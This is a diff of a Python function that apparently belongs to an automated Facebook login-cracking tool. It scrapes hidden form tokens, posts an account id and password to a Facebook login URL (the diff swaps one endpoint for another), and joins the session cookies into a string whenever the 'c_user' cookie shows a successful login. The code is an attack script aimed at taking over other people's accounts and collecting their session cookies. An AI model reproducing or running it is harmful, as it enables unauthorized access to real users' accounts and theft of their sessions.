@@ -1258,17 +1258,11 @@ def m5(idf,pwv):
    lgnjs = str(int(time.time()))
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
-    'email': idf,
-    'pass': ps,
-    'guid': re.search(r'name="guid" value="(.*?)"', free_fb).group(1),
-    'lgnrnd': re.search(r'name="lgnrnd" value="(.*?)"', free_fb).group(1),
-    'lgndim': re.search(r'name="lgndim" value="(.*?)"', free_fb).group(1),
-    'lsd': re.search(r'name="lsd" value="(.*?)"', free_fb).group(1),
-    'jazoest': re.search(r'name="jazoest" value="(.*?)"', free_fb).group(1),
-    'lgnjs': lgnjs,
-    'locale': 'en_GB',
-    'login_source': 'comet_headerless_login',
-    'login': 'Log In'}
+            "lsd":re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb.text)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
+            "li":re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
+            "email":idf,"pass":ps,"Host":"https://m.prod.facebook.com/login/save-device/?login"}
    header_freefb = {
     "authority": "m.facebook.com",
     "method": "POST",
@@ -1298,7 +1292,7 @@ def m5(idf,pwv):
     "Upgrade-Insecure-Requests": "1",
     "User-Agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
     "Viewport-Width": "885"} #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://business.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbizweb_landing_fb_login_button%26biz_login_source%3Dbizweb_landing_fb_login_button',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221jt9n9yiqnynb1ik1fwn1dqe09f113zr4hslc6aw14cvw261ihv21p%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D86e59456-82f4-4a02-8b36-4db76c4584e6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221jt9n9yiqnynb1ik1fwn1dqe09f113zr4hslc6aw14cvw261ihv21p%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
